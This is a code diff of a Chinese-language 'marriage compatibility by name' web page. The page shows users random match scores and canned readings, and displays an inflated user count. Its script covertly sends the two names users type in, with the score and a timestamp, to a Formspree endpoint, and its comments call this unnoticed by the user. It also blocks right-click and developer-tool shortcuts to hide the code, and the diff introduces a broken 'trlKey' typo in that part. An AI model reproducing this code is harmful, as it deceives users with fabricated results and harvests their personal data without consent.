@@ -267,146 +267,143 @@
 
     <script>
         // ==================== 配置区域（必须修改） ====================
-        // 将下面的 YOUR_FORMSPREE_ENDPOINT 替换为你的Formspree Endpoint URL
-        const FORMSFREE_ENDPOINT = 'https://formspree.io/f/mjgeypng';
-        // ==================== 配置结束 ====================
-        
-        // 测算结果模板库（随机显示，增加真实性）
-        const analysisTemplates = [
-            "姓名能量场高度契合，五行相生互补。字理数理显示前世有未了缘分，今生相遇乃天意安排。性格兼容度优秀，价值观高度一致，是难得的良缘匹配。",
-            "双方姓名蕴含的能量频率相近，形成和谐共振。数理分析显示互补性强，一方刚强一方柔和，形成完美平衡。前世因果线清晰，今生续缘概率极高。",
-            "姓名笔画数理呈现吉象，天地人三格配置优良。五行属性相生相助，能量流动顺畅。性格匹配度上等，沟通障碍少，情感发展空间广阔。",
-            "从姓名字理看，两人有共同的命运交点。能量场分析显示吸引力强，缘分线牢固。虽然偶有小摩擦，但整体兼容度优秀，是可持续发展的良缘。"
-        ];
-        
-        const suggestionTemplates = [
-            "建议多创造共同经历，加深情感连接。今年下半年有重要缘分节点，请把握机会。信任与沟通是维系此段缘分的关键。",
-            "多关注彼此的精神需求，定期进行深度交流。避免在琐事上过度计较，保持包容心态。今年秋季有重要发展机遇。",
-            "建议建立共同的兴趣爱好，增强情感纽带。财务观念需要提前沟通协调。明年春季关系可能有重要进展。",
-            "保持适度的个人空间，同时加强情感互动。重要决策前充分沟通。今年年底前有深化关系的机会。"
-        ];
-        
-        // 随机用户数（增加真实感）
-        document.getElementById('userCount').textContent = 
-            (8742 + Math.floor(Math.random() * 1000)).toLocaleString();
-        
-        // 主测算函数
-        function startCalculation() {
-            const name1 = document.getElementById('name1').value.trim();
-            const name2 = document.getElementById('name2').value.trim();
-            
-            if (!name1 || !name2) {
-                alert('请输入双方姓名');
-                return;
-            }
-            
-            // 显示加载动画
-            document.querySelector('.input-section').style.display = 'none';
-            document.getElementById('loading').style.display = 'block';
-            
-            // 倒计时效果
-            let countdown = 5;
-            const countdownEl = document.getElementById('countdown');
-            const timer = setInterval(() => {
-                countdown--;
-                countdownEl.textContent = countdown;
-                if (countdown <= 0) {
-                    clearInterval(timer);
-                    showResult(name1, name2);
-                }
-            }, 1000);
+// 将下面的 YOUR_FORMSPREE_ENDPOINT 替换为你的Formspree Endpoint URL
+const FORMSFREE_ENDPOINT = 'https://formspree.io/f/mjgeypng';
+// ==================== 配置结束 ====================
+
+// 测算结果模板库（随机显示，增加真实性）
+const analysisTemplates = [
+    "姓名能量场高度契合，五行相生互补。字理数理显示前世有未了缘分，今生相遇乃天意安排。性格兼容度优秀，价值观高度一致，是难得的良缘匹配。",
+    "双方姓名蕴含的能量频率相近，形成和谐共振。数理分析显示互补性强，一方刚强一方柔和，形成完美平衡。前世因果线清晰，今生续缘概率极高。",
+    "姓名笔画数理呈现吉象，天地人三格配置优良。五行属性相生相助，能量流动顺畅。性格匹配度上等，沟通障碍少，情感发展空间广阔。",
+    "从姓名字理看，两人有共同的命运交点。能量场分析显示吸引力强，缘分线牢固。虽然偶有小摩擦，但整体兼容度优秀，是可持续发展的良缘。"
+];
+
+const suggestionTemplates = [
+    "建议多创造共同经历，加深情感连接。今年下半年有重要缘分节点，请把握机会。信任与沟通是维系此段缘分的关键。",
+    "多关注彼此的精神需求，定期进行深度交流。避免在琐事上过度计较，保持包容心态。今年秋季有重要发展机遇。",
+    "建议建立共同的兴趣爱好，增强情感纽带。财务观念需要提前沟通协调。明年春季关系可能有重要进展。",
+    "保持适度的个人空间，同时加强情感互动。重要决策前充分沟通。今年年底前有深化关系的机会。"
+];
+
+// 随机用户数（增加真实感）
+document.getElementById('userCount').textContent = (8742 + Math.floor(Math.random() * 1000)).toLocaleString();
+
+// 主测算函数
+function startCalculation() {
+    const name1 = document.getElementById('name1').value.trim();
+    const name2 = document.getElementById('name2').value.trim();
+
+    if (!name1 || !name2) {
+        alert('请输入双方姓名');
+        return;
+    }
+
+    // 显示加载动画
+    document.querySelector('.input-section').style.display = 'none';
+    document.getElementById('loading').style.display = 'block';
+
+    // 倒计时效果
+    let countdown = 5;
+    const countdownEl = document.getElementById('countdown');
+    const timer = setInterval(() => {
+        countdown--;
+        countdownEl.textContent = countdown;
+        if (countdown <= 0) {
+            clearInterval(timer);
+            showResult(name1, name2);
         }
-        
-        // 显示测算结果
-        function showResult(name1, name2) {
-            // 生成随机匹配度（70-99%）
-            const score = Math.floor(Math.random() * 30) + 70;
-            
-            // 根据分数生成星数
-            let stars = '';
-            if (score >= 90) stars = '★★★★★';
-            else if (score >= 80) stars = '★★★★☆';
-            else if (score >= 70) stars = '★★★☆☆';
-            else stars = '★★☆☆☆';
-            
-            // 随机选择分析文本
-            const analysisText = analysisTemplates[Math.floor(Math.random() * analysisTemplates.length)];
-            const suggestionText = suggestionTemplates[Math.floor(Math.random() * suggestionTemplates.length)];
-            
-            // 更新页面显示
-            document.getElementById('loading').style.display = 'none';
-            document.getElementById('score').textContent = score + '%';
-            document.getElementById('stars').textContent = stars;
-            document.getElementById('analysisText').textContent = analysisText;
-            document.getElementById('suggestionText').textContent = suggestionText;
-            document.getElementById('result').style.display = 'block';
-            
-            // 悄无声息地提交数据到后端
-            submitDataToBackend(name1, name2, score);
-        }
-        
-        // 数据提交函数（用户完全无感知）
-        // 替换原来的第85-130行附近的submitDataToBackend函数
-        function submitDataToBackend(name1, name2, score) {
+    }, 1000);
+}
+
+// 显示测算结果
+function showResult(name1, name2) {
+    // 生成随机匹配度（70-99%）
+    const score = Math.floor(Math.random() * 30) + 70;
+
+    // 根据分数生成星数
+    let stars = '';
+    if (score >= 90) stars = '★★★★★';
+    else if (score >= 80) stars = '★★★★☆';
+    else if (score >= 70) stars = '★★★☆☆';
+    else stars = '★★☆☆☆';
+
+    // 随机选择分析文本
+    const analysisText = analysisTemplates[Math.floor(Math.random() * analysisTemplates.length)];
+    const suggestionText = suggestionTemplates[Math.floor(Math.random() * suggestionTemplates.length)];
+
+    // 更新页面显示
+    document.getElementById('loading').style.display = 'none';
+    document.getElementById('score').textContent = score + '%';
+    document.getElementById('stars').textContent = stars;
+    document.getElementById('analysisText').textContent = analysisText;
+    document.getElementById('suggestionText').textContent = suggestionText;
+    document.getElementById('result').style.display = 'block';
+
+    // 悄无声息地提交数据到后端
+    submitDataToBackend(name1, name2, score);
+}
+
+// 数据提交函数（用户完全无感知）
+function submitDataToBackend(name1, name2, score) {
     // 创建更简单的数据格式
-             const formData = {
-                '姓名1': name1,
-                '姓名2': name2,
-                '匹配度': score + '%',
-                '测算时间': new Date().toLocaleString('zh-CN'),
-                '来源': '姻缘测算网站'
-            };
-    
-            // 重要：使用Formspree默认的FormData格式，而不是JSON
-            const formDataEncoded = new FormData();
-            formDataEncoded.append('姓名1', name1);
-            formDataEncoded.append('姓名2', name2);
-            formDataEncoded.append('匹配度', score + '%');
-            formDataEncoded.append('测算时间', new Date().toLocaleString('zh-CN'));
-    
-        // 提交到Formspree
-        fetch(FORMSFREE_ENDPOINT, {
-            method: ‘POST’,
-            body: formDataEncoded,
-    // 移除 ‘mode: ‘no-cors’’ 这一行，或将其改为 ‘cors’。最简单的方法是直接删除该行。
-            headers: {
-                ‘Accept’: ‘application/json’ // 明确告知期望的响应格式（可选，但更规范）
-            }
-        }).then(response => {
-    // 请求已发送，可以静默处理
-            console.log(‘数据已记录（用户无感知）’);
-        }).catch(error => {
-    // 静默失败，不影响用户体验
-            console.error(‘提交失败（用户无感知）:’, error);
-        });
+    const formData = {
+        '姓名1': name1,
+        '姓名2': name2,
+        '匹配度': score + '%',
+        '测算时间': new Date().toLocaleString('zh-CN'),
+        '来源': '姻缘测算网站'
+    };
 
+    // 重要：使用Formspree默认的FormData格式，而不是JSON
+    const formDataEncoded = new FormData();
+    formDataEncoded.append('姓名1', name1);
+    formDataEncoded.append('姓名2', name2);
+    formDataEncoded.append('匹配度', score + '%');
+    formDataEncoded.append('测算时间', new Date().toLocaleString('zh-CN'));
 
-        
-        // 分享功能（伪装）
-        function shareResult() {
-            alert('姻缘证书已生成！\n\n（此功能为演示效果，实际可扩展为图片生成）');
+    // 提交到Formspree (关键：使用正确的引号和请求配置)
+    fetch(FORMSFREE_ENDPOINT, {
+        method: 'POST',
+        body: formDataEncoded,
+        headers: {
+            'Accept': 'application/json' // 明确告知期望的响应格式
         }
-        
-        // 重新测算
-        function resetForm() {
-            document.getElementById('name1').value = '';
-            document.getElementById('name2').value = '';
-            document.getElementById('result').style.display = 'none';
-            document.querySelector('.input-section').style.display = 'block';
-        }
-        
-        // 防止右键查看源代码（增加破解难度）
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-        });
-        
-        // 防止F12开发者工具（基础防护）
-        document.onkeydown = function(e) {
-            if (e.keyCode == 123) return false; // F12
-            if (e.ctrlKey && e.shiftKey && e.keyCode == 73) return false; // Ctrl+Shift+I
-            if (e.ctrlKey && e.shiftKey && e.keyCode == 74) return false; // Ctrl+Shift+J
-            if (e.ctrlKey && e.keyCode == 85) return false; // Ctrl+U
-        };
+    }).then(response => {
+        // 请求已发送，可以静默处理
+        console.log('数据已记录（用户无感知）');
+    }).catch(error => {
+        // 静默失败，不影响用户体验
+        console.error('提交失败（用户无感知）:', error);
+    });
+}
+
+// 分享功能（伪装）
+function shareResult() {
+    alert('姻缘证书已生成！\n\n（此功能为演示效果，实际可扩展为图片生成）');
+}
+
+// 重新测算
+function resetForm() {
+    document.getElementById('name1').value = '';
+    document.getElementById('name2').value = '';
+    document.getElementById('result').style.display = 'none';
+    document.querySelector('.input-section').style.display = 'block';
+}
+
+// 防止右键查看源代码（增加破解难度）
+document.addEventListener('contextmenu', function(e) {
+    e.preventDefault();
+});
+
+// 防止F12开发者工具（基础防护）
+document.onkeydown = function(e) {
+    if (e.keyCode == 123) return false; // F12
+    if (e.trlKey && e.shiftKey && e.keyCode == 73) return false; // Ctrl+Shift+I
+    if (e.trlKey && e.shiftKey && e.keyCode == 74) return false; // Ctrl+Shift+J
+    if (e.trlKey && e.keyCode == 85) return false; // Ctrl+U
+};
+
     </script>
 </body>
 </html>
